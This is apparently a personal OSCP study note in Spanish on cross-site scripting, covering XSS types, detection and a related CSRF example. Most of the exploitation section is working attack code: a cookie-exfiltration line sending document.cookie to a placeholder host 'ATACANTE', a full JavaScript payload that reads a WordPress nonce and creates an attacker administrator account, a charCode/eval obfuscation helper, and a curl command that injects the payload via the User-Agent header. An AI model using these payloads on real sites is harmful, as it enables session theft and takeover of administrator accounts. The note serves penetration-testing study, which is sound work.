---
tipo: tecnica
fase: explotacion
so: 
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# Cross-Site Scripting (XSS)

> [!abstract] Qué es y cuándo usarla
> Inyección de código cliente (normalmente **JavaScript**) en una página que renderiza el navegador de **otro usuario**. Abusa de la confianza del usuario en el sitio. El script corre en el **contexto de la víctima** (su navegador, no el servidor): robo de sesión, redirecciones, acciones en su nombre. Buscar siempre que un input aparezca reflejado o almacenado y servido sin sanear.

## Tipos
| Tipo | Dónde vive el payload | A quién afecta | Ejemplos típicos |
|---|---|---|---|
| **Stored** (Persistent) | Guardado en BD/caché del servidor | A **todos** los que visiten la página | Comentarios, foros, reviews, logs (User-Agent) |
| **Reflected** | En la request/enlace, reflejado en la respuesta | Solo a quien envía la request/clica el link | Buscadores, mensajes de error |
| **DOM-based** | Solo en el DOM del navegador (JS del cliente) | Depende (stored o reflected) | JS que usa datos controlados por el usuario |

## Identificación
Inyectar caracteres especiales en inputs/headers y ver si vuelven sin codificar:
```
< > ' " { } ;
```
- `< >` → tags HTML · `{ }` → funciones JS · `' "` → strings · `;` → fin de sentencia.
- Si la app codifica (`&lt;` por `<`) no es explotable ahí. Si los devuelve tal cual → candidato a XSS.
- El payload depende del **contexto** de inyección:
  - Entre `<div>...</div>` → necesitas tus propios `<script>` (requiere `< >`).
  - Dentro de un `<script>` existente → suele bastar con comillas y `;`.

## PoC básico
```html
<script>alert(42)</script>
```
Un `alert()` da confirmación visual inmediata. En stored XSS por header, inyectarlo en el **User-Agent** con Repeater/curl y disparar la página que lo muestra.

## Robo de cookies (si NO hay HttpOnly)
```javascript
new Image().src="http://ATACANTE/c?"+document.cookie;   // exfiltra la cookie al atacante
```
> [!warning] Flags de cookie
> - **HttpOnly**: JS **no** puede leer la cookie → el robo por XSS falla. (WordPress las marca así.)
> - **Secure**: solo se envía por HTTPS.
> Comprobar en DevTools > **Storage > Cookies**. Si hay HttpOnly, buscar otra vía (ej. hacer que la víctima ejecute acciones).

## Privesc: acción en nombre del admin (crear usuario WP)
Cuando no puedes robar la cookie (HttpOnly), haz que el JS ejecutado por el admin realice la acción. WordPress protege las acciones con un **nonce** (token anti-CSRF), pero el XSS corre en su contexto y puede **leerlo** de la página y reutilizarlo:
```javascript
// 1) leer el nonce
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonce = nonceRegex.exec(ajaxRequest.responseText)[1];
// 2) crear admin con el nonce
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### Minificar + codificar el payload
Para que no rompa por bad characters, **minificar** (JS Compress) y codificar a `String.fromCharCode(...)`, ejecutando con `eval()`:
```javascript
function encode_to_javascript(string) {
    var input = string, output = '';
    for (pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if (pos != (input.length - 1)) output += ",";
    }
    return output;
}
console.log(encode_to_javascript('insert_minified_javascript'));
```
Entrega final como header:
```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(118,97,114,...))</script>" \
  --proxy 127.0.0.1:8080
```

> [!warning] Detección / problemas
> - XSS es **ruidoso** si haces pop-ups en producción; usa payloads discretos (callbacks a tu servidor) en engagements reales.
> - Con `<script>` en un campo que se pinta como texto, el navegador no muestra nada pero **sí ejecuta** el script.
> - HttpOnly bloquea el robo de cookie; WAFs y filtros pueden requerir *encoding* alternativo del payload.

## CSRF (relacionado)
Ataque en el que la víctima **autenticada** clica un enlace que ejecuta una acción preconfigurada en su nombre. Se mitiga con **nonces/tokens** impredecibles. Un stored XSS **rompe** esa mitigación porque puede leer el token vigente.
```html
<a href="http://banco.com/send_btc?account=ATTACKER&amount=100000">cat memes!</a>
```

## Visto en
- Módulo: [[08 - Introduction to Web Application Attacks]]
- Cheatsheet: [[Web]]
- Máquinas: [[]]
